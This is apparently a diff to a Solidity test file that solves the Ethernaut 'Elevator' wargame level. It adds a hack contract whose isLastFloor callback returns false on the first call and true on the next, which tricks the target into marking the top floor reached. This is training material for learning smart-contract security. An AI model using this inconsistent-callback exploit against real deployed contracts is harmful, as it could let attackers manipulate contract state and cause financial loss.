@@ -29,7 +29,15 @@ contract ElevatorTest is Test {
         /****************
          *    Attack     *
          *************** */
-
+        /*
+         * Here the goal is to reach the last floor.
+         * In order to do so, we create a hack contract that will
+         * always return true in the function isLastFloor,
+         * which shadows isLastFloor from Building, that will run in the contest of Elevator.sol
+         */
+        ElevatorHack elevatorHack = new ElevatorHack(levelAddress);
+        elevatorHack.attack();
+        assertEq(ethernautElevator.top(), true);
         /*****************
          *Level Submission*
          ***************  */
@@ -43,7 +51,7 @@ contract ElevatorTest is Test {
 
 contract ElevatorHack {
     Elevator public challenge;
-    uint256 timesCalled;
+    uint256 floorUp;
 
     constructor(address challengeAddress) {
         challenge = Elevator(challengeAddress);
@@ -56,8 +64,11 @@ contract ElevatorHack {
     function isLastFloor(
         uint256 /* floor */
     ) external returns (bool) {
-        timesCalled++;
-        if (timesCalled > 1) return true;
-        else return false;
+        floorUp++;
+        if (floorUp > 1) {
+            return true;
+        } else {
+            return false;
+        }
     }
 }
